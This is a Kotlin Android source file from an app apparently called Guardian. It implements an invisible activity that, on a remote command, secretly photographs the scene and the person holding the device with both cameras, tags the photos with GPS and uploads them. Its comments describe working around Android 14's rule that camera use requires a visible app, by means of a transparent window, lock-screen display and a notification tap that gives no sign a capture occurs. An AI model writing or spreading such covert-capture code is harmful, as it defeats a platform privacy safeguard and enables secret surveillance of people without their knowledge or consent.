package io.sonalit.guardian.ui.capture

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import dagger.hilt.android.AndroidEntryPoint
import io.sonalit.guardian.data.local.AppDatabase
import io.sonalit.guardian.data.remote.GuardianApi
import io.sonalit.guardian.service.CameraCaptureController
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import javax.inject.Inject

/**
 * Last-resort capture path for a capture_photo command on Android 14+ non-owner
 * devices, where the OS blocks a background camera-FGS start so the covert
 * service can't run (see CommandExecutor.canSilent). CommandExecutor posts a
 * notification whose tap opens this activity.
 *
 * It is deliberately invisible: a translucent, content-less window (manifest
 * theme) that being momentarily foreground is enough to satisfy the OS's
 * "camera needs a visible app" rule on 14+. On launch it drives the SAME silent
 * capture engine the covert service uses — both lenses, straight to R2, no
 * preview and no shutter tap — then finishes. The notification the officer
 * already tapped is the only footprint; nothing shows on screen.
 */
@AndroidEntryPoint
class CaptureRequestActivity : ComponentActivity() {

    @Inject lateinit var api: GuardianApi
    @Inject lateinit var okHttp: OkHttpClient
    @Inject lateinit var db: AppDatabase

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    @Volatile private var capturing = false

    private val requestCamera =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) startCapture() else finishAndRemoveTask()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Show over a locked (but on) screen so a tapped request is actionable
        // without unlocking. No setTurnScreenOn: we never light a dark screen —
        // the tap that brought us here already means the screen is on.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) setShowWhenLocked(true)
        // No setContent(): the window is translucent, so nothing is drawn.
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) ==
            PackageManager.PERMISSION_GRANTED
        ) {
            startCapture()
        } else {
            // Only reachable if CAMERA was never granted — the one unavoidable
            // visible prompt, shown once.
            requestCamera.launch(Manifest.permission.CAMERA)
        }
    }

    private fun startCapture() {
        if (capturing) return
        capturing = true
        scope.launch {
            val fix = runCatching { withContext(Dispatchers.IO) { db.gpsFixDao().getLatest() } }.getOrNull()
            // Rear (the scene) then front (whoever holds the device), same order
            // as the covert service so the tagging is identical.
            CameraCaptureController(this@CaptureRequestActivity, api, okHttp)
                .captureSequence(listOf("back", "front"), fix?.lat, fix?.lon) {
                    runOnUiThread { runCatching { finishAndRemoveTask() } }
                }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}
